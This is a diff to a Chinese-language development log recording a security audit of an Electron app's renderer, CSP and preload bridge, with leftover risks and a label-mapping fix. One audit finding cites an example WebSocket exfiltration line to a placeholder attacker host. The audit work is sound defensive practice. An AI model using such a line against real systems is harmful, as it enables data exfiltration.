@@ -1122,3 +1122,13 @@
   修 sdks.md（1.2.0→1.12.1 + 日期 + 页头注明）+ 给 `check-interface-maps.mjs` 加**第三节**（文档「当前 X.Y.Z」== mcp-server version；提取不到也红）。验证三节全绿；反证：改回 1.2.0 → 红并指明差值。
 - 2026-10-20 **R102-A1 认领**：`executor-desktop` **渲染层 + preload 桥**安全审计。背景：主进程已加 IPC sender 白名单（R86-A1，只认自己页面的主 frame）
   ⇒ **渲染层内部的代码执行（XSS/注入 HTML）仍能过那道闸**，渲染层自身成了主要剩余攻击面。四轴：XSS sink / CSP 与 webPreferences / preload 桥暴露面 / 外链与导航。
+- 2026-10-20 **★ R102-A1 done（commit 3c48bcb1）**：**executor-desktop 渲染层 + preload 桥安全审计**。承接 R86-A1：IPC sender 闸只认自己页面的主 frame ⇒ **渲染层内的代码执行仍能过闸**，渲染层成了主要剩余攻击面。
+  ① **`connect-src` 含裸 `ws:`**（= 允许 WebSocket 连任意 host）—— 对 CSP 而言自相矛盾：本职是堵外带，却留了一条现成外带通道（`new WebSocket('ws://attacker')`）。改为显式 loopback，dev HMR 仍可用。
+  ② **preload 桥形参只是 TS 声明**（运行时无清洗）：桥形态本身干净（单一 exposeInMainWorld、52 具名方法、**无** ipcRenderer 透传、**无** invoke/send 通用入口、channel 全字面量），新增 `bridge-args.ts` 归一 12 个方法；`asString` 非法/超长返回**空串而非截断**（截断会把非法路径「修」成另一个合法路径）。
+  另两轴**干净且有证据**：XSS sink **0 处**（不可信数据全走 React 文本节点，唯一 DOM 写入是 `textContent`）；外链 **0 处**（所有「打开」走 IPC → shell.openPath + path-domain 白名单）。webPreferences 只读核对：contextIsolation/nodeIntegration:false/sandbox/webviewTag:false 均在位。
+  验证：`test:renderer` 绿（新增四轴判据块）+ tsc 0；执行者 4 条反证均还原即红；**总控独立复验**：meta 改回裸 `ws:` → selftest 红并点名「构成 XSS 外带通道」。
+  遗留 5 条：`will-navigate` 用 `startsWith('file://')` 放行任意本地文件（不可直接利用，建议钉 pathToFileURL + 补 will-redirect）/ frame-ancestors 在 meta 无效 / connect-src 仍留 dev localhost / **破坏性 channel 无 IPC 层二次确认（确认只在 UI ⇒ XSS 可直接调）** / 源码树有过期 `src/renderer/dist/**` 建议清理。
+- 2026-10-20 **★ R104 done（commit 9447366c）**：**19 个审计动作在前端显示原始码**。代码 64 个 action vs `ACTION_LABEL_KEYS` 只映射 **48** —— 缺的恰好是最近新加的（config 三件套、SOP 十件套、task.import 等），又是「只漏新增」。
+  反向漂移 3 个（deployment.delete/reject/rollback）**保留**是对的：历史审计行里还有它们。修：补 19 个映射 + zh/en 各 17 条词条（另 2 条是「词条在、映射忘」的孤儿）+ 给 `check-interface-maps.mjs` 加**第四节**（每个 action 必须映射、每个键双语齐全、下界 40、反向不校验）。
+  **顺手发现两条测试在钉住这个缺陷**：它们把 `config.update`/`sop.timeout.unclaimed` 当作「未知动作」fixture 断言「回退原始码」—— 正是 R94-A1 那条教训的第二次出现：**把「当前行为」当「预期行为」的 fixture 会把缺陷固化成契约**。改 fixture 为 `legacy.unknown_action`，让用例继续测回退语义。
+  验证：vitest 20 passed（+1 新用例钉标签渲染）、tsc 0、守卫四节全绿；反证：删一条映射 → 守卫点名该动作。
